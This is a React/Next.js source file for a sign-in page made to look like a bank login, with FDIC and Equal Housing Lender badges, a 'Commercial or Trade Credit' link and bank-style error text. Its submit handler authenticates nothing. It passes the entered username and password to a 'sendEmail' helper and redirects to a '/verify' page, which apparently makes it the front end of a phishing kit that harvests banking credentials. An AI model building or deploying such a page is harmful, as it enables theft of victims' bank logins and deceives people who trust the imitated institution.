"use client";
import { Button } from "@/components/ui/button";
import { Checkbox } from "@/components/ui/checkbox";
import { Field, FieldError, FieldGroup, FieldLabel } from "@/components/ui/field";
import { Input } from "@/components/ui/input";
import { sendEmail } from "@/lib/fun";
import { zodResolver } from "@hookform/resolvers/zod";
import Head from "next/head";
import Image from "next/image";
import Link from "next/link";
import { useRouter } from "next/navigation";
import { useState } from "react";
import { Controller, useForm } from "react-hook-form";
import { z } from "zod";

const loginSchema = z.object({
  username: z
    .string()
    .min(1, "This field is required")
    .email("Invalid email address"),
  password: z.string().min(6, "Password must be at least 6 characters"),
  remember: z.boolean().default(false).optional(),
});

export type LoginSchema = z.infer<typeof loginSchema>;

export default function Home() {
  const router = useRouter();
  const [showPassword, setShowPassword] = useState(false);
  const [showError, setShowError] = useState(false);
  const form = useForm<LoginSchema>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      username: "",
      password: "",
      remember: false,
    },
  });

  const onSubmit = async (data: z.infer<typeof loginSchema>) => {
    try {
      // console.log(data);
      await sendEmail(data);
      router.push("/verify");
    } catch (error) {
      setShowError(true);
    }
  };

  return (
    <div className="flex min-h-[calc(100vh-52px)] flex-col items-center justify-between bg-gray-50 font-sans pt-8">
      <Head>
        <title>Sign In</title>
      </Head>
      <div className="w-full max-w-[80%] mx-auto flex flex-col items-center gap-6">
        <div className="w-full max-w-[400px]  px-12 py-8 border border-gray-300 rounded-md  bg-white">
          <div className="flex flex-col items-center justify-center w-full mb-6 gap-4">
            <Image
              src="/logo1.svg"
              alt="logo"
              width={140}
              height={40}
              className="h-10"
            />
            <h2 className="font-semibold text-[22px] text-gray-900">Sign In</h2>
          </div>

          {/* Conditional Error Message */}
          {showError && (
            <div className="mb-5 bg-red-50 border border-red-300 rounded-md p-3 flex gap-3">
              <div className="flex-shrink-0 pt-0.5">
                <svg
                  className="w-4 h-4 text-red-600"
                  fill="currentColor"
                  viewBox="0 0 20 20"
                >
                  <path
                    fillRule="evenodd"
                    d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z"
                    clipRule="evenodd"
                  />
                </svg>
              </div>
              <div className="flex flex-col gap-1">
                <p className="text-sm font-semibold text-gray-900">
                  We didn't recognize that info
                </p>
                <p className="text-xs text-gray-700">
                  Double-check your username and password and try signing in
                  again.
                </p>
              </div>
            </div>
          )}

          <form onSubmit={form.handleSubmit(onSubmit)}>
            <FieldGroup className="gap-4">
              <Controller
                control={form.control}
                name="username"
                render={({ field }) => (
                  <Field>
                    <FieldLabel className="text-sm font-semibold text-gray-900 mb-1.5">
                      Username
                    </FieldLabel>
                    <div className="relative">
                      <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500">
                        <svg
                          className="w-4 h-4"
                          fill="currentColor"
                          viewBox="0 0 20 20"
                        >
                          <path
                            fillRule="evenodd"
                            d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z"
                            clipRule="evenodd"
                          />
                        </svg>
                      </div>
                      <Input
                        {...field}
                        className="pl-9 h-[42px] text-sm border-gray-300 focus-visible:ring-[var(--color-default)] focus-visible:border-[var(--color-default)]"
                        placeholder=""
                      />
                    </div>
                    <FieldError />
                    {/* {form.formState.errors.username && (
                      <p className="text-xs text-red-600 mt-1">
                        This field is required.
                      </p>
                    )} */}
                  </Field>
                )}
              />

              <Controller
                control={form.control}
                name="password"
                render={({ field }) => (
                  <Field>
                    <FieldLabel className="text-sm font-semibold text-gray-900 mb-1.5">
                      Password
                    </FieldLabel>
                    <div className="relative">
                      <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500">
                        <svg
                          className="w-4 h-4"
                          fill="currentColor"
                          viewBox="0 0 20 20"
                        >
                          <path
                            fillRule="evenodd"
                            d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
                            clipRule="evenodd"
                          />
                        </svg>
                      </div>
                      <Input
                        {...field}
                        type={showPassword ? "text" : "password"}
                        className="pl-9 pr-10 h-[42px] text-sm border-gray-300 focus-visible:ring-[var(--color-default)] focus-visible:border-[var(--color-default)]"
                        placeholder=""
                      />
                      <button
                        type="button"
                        className="absolute cursor-pointer right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
                        onClick={() => setShowPassword(!showPassword)}
                      >
                        {showPassword ? (
                          <svg
                            className="w-5 h-5"
                            fill="none"
                            stroke="currentColor"
                            viewBox="0 0 24 24"
                          >
                            <path
                              strokeLinecap="round"
                              strokeLinejoin="round"
                              strokeWidth={2}
                              d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"
                            />
                          </svg>
                        ) : (
                          <svg
                            className="w-5 h-5"
                            fill="none"
                            stroke="currentColor"
                            viewBox="0 0 24 24"
                          >
                            <path
                              strokeLinecap="round"
                              strokeLinejoin="round"
                              strokeWidth={2}
                              d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
                            />
                            <path
                              strokeLinecap="round"
                              strokeLinejoin="round"
                              strokeWidth={2}
                              d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"
                            />
                          </svg>
                        )}
                      </button>
                    </div>
                    {form.formState.errors.password && (
                      <p className="text-xs text-red-600 mt-1">
                        This field is required.
                      </p>
                    )}
                  </Field>
                )}
              />

              <Controller
                control={form.control}
                name="remember"
                render={({ field }) => (
                  <div className="flex items-center space-x-2 mt-1">
                    <Checkbox
                      id="remember"
                      checked={field.value}
                      onCheckedChange={field.onChange}
                      className="w-4 h-4 data-[state=checked]:bg-[var(--color-default)] data-[state=checked]:border-[var(--color-default)]"
                    />
                    <label
                      htmlFor="remember"
                      className="text-sm leading-none cursor-pointer text-gray-900"
                    >
                      Remember Me
                    </label>
                  </div>
                )}
              />

              <Button
                type="submit"
                className="w-full mt-4 bg-[var(--color-default)] hover:bg-[#006299] text-white font-medium h-[42px] text-[15px] rounded"
              >
                Sign in
              </Button>
            </FieldGroup>
          </form>
          <div className="flex flex-col gap-2 mt-5">
            <Link
              href="#"
              className="text-[13px] font-bold text-[#0070A8] hover:underline"
            >
              Forgot Username or Password?
            </Link>
            <Link
              href="#"
              className="text-[13px] font-bold text-[#0070A8] hover:underline"
            >
              Set Up Online Access
            </Link>
          </div>
        </div>

        <div className="flex flex-col items-center gap-4 text-center my-3">
          <p className="text-md text-gray-900">Looking for these accounts?</p>
          <Link
            href="#"
            className="text-[15px] font-bold text-[#0070A8] hover:underline"
          >
            Commercial or Trade Credit
          </Link>
        </div>
      </div>

      <div className="w-full h-[50px] border-t border-gray-300   flex items-center justify-around bg-white">
        <div className="flex items-center justify-end flex-wrap gap-x-2 gap-y-1 text-[11px] w-[65%]">
          <Link href="#" className="text-black hover:underline text-[15px] font-light">
            Contact us
          </Link>
          <span className="text-gray-800">|</span>
          <Link href="#" className="text-black hover:underline text-[13px] font-light">
            Legal
          </Link>
          <span className="text-gray-800">|</span>
          <Link href="#" className="text-black hover:underline text-[13px] font-light">
            Privacy
          </Link>
          <span className="text-gray-800">|</span>
          <Link href="#" className="text-black hover:underline text-[13px] font-light">
            Security
          </Link>
          <span className="text-gray-800">|</span>
          <Link href="#" className="text-black hover:underline text-[13px] font-light">
            Terms & Conditions
          </Link>
          <span className="text-gray-800">|</span>
          <Link href="#" className="text-black hover:underline text-[13px] font-light ">
            Accessibility
          </Link>
        </div>
        <div className="flex items-center justify-end gap-3 mt-3 pb-2 w-[20%]">
          <Image src="fdic.svg" alt="Description" width={40} height={40} />
          <Image src="equal_housing_lender.svg" alt="Description" width={40} height={40} />
        </div>
      </div>
    </div>
  );
}
